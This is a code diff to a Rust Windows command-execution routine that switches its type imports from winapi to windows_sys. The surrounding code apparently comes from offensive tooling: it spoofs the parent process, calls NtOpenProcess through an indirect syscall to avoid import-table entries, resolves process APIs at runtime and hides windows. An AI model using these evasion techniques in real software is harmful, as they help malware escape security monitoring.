@@ -9,11 +9,14 @@ pub fn execute_command(
 ) -> Result<std::process::Output> {
     use std::ffi::c_void;
     use std::os::windows::ffi::OsStrExt;
-    use winapi::um::processthreadsapi::PROCESS_INFORMATION;
-    use winapi::um::winbase::{CREATE_NO_WINDOW, EXTENDED_STARTUPINFO_PRESENT, STARTUPINFOEXW};
-    use winapi::um::winnt::{HANDLE, PROCESS_CREATE_PROCESS};
+    use crate::win_types::PROCESS_INFORMATION;
+    use windows_sys::Win32::System::Threading::CREATE_NO_WINDOW;
+    use windows_sys::Win32::System::Threading::EXTENDED_STARTUPINFO_PRESENT;
+    use windows_sys::Win32::System::Threading::STARTUPINFOEXW;
+    use crate::win_types::HANDLE;
+    use windows_sys::Win32::System::Threading::PROCESS_CREATE_PROCESS;
     const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
-    use winapi::um::winbase::STARTF_USESTDHANDLES;
+    use windows_sys::Win32::System::Threading::STARTF_USESTDHANDLES;
 
     const ERROR_INSUFFICIENT_BUFFER: u32 = 122;
 
@@ -86,7 +89,7 @@ pub fn execute_command(
         type CreatePipeFn = unsafe extern "system" fn(
             *mut HANDLE,                                      // hReadPipe
             *mut HANDLE,                                      // hWritePipe
-            *mut winapi::um::minwinbase::SECURITY_ATTRIBUTES, // lpPipeAttributes
+            *mut crate::win_types::SECURITY_ATTRIBUTES, // lpPipeAttributes
             u32,                                              // nSize
         ) -> i32; // BOOL
         let create_pipe: CreatePipeFn = std::mem::transmute(create_pipe_addr);
@@ -104,7 +107,7 @@ pub fn execute_command(
             u32,                                              // dwCreationFlags
             *mut c_void,                                      // lpEnvironment
             *mut u16,                                         // lpCurrentDirectory
-            *mut winapi::um::processthreadsapi::STARTUPINFOW, // lpStartupInfo
+            *mut crate::win_types::STARTUPINFOW, // lpStartupInfo
             *mut PROCESS_INFORMATION,                         // lpProcessInformation
         ) -> i32; // BOOL
         let create_process_w: CreateProcessWFn = std::mem::transmute(create_process_w_addr);
@@ -140,9 +143,9 @@ pub fn execute_command(
         // OpenProcess → NtOpenProcess (indirect syscall, no IAT entry)
         let mut p_handle_raw: usize = 0;
         if parent_pid != std::process::id() {
-            let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
+            let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
             obj_attr.Length =
-                std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+                std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
             let mut client_id = [0u64; 2];
             client_id[0] = parent_pid as u64;
             let status = crate::syscall!(
@@ -214,9 +217,9 @@ pub fn execute_command(
         let mut stdout_wr: HANDLE = std::ptr::null_mut();
 
         if capture_output {
-            let mut sec_attr: winapi::um::minwinbase::SECURITY_ATTRIBUTES = std::mem::zeroed();
+            let mut sec_attr: crate::win_types::SECURITY_ATTRIBUTES = std::mem::zeroed();
             sec_attr.nLength =
-                std::mem::size_of::<winapi::um::minwinbase::SECURITY_ATTRIBUTES>() as u32;
+                std::mem::size_of::<crate::win_types::SECURITY_ATTRIBUTES>() as u32;
             sec_attr.bInheritHandle = 1; // TRUE
 
             if create_pipe(&mut stdout_rd, &mut stdout_wr, &mut sec_attr, 0) != 0 {
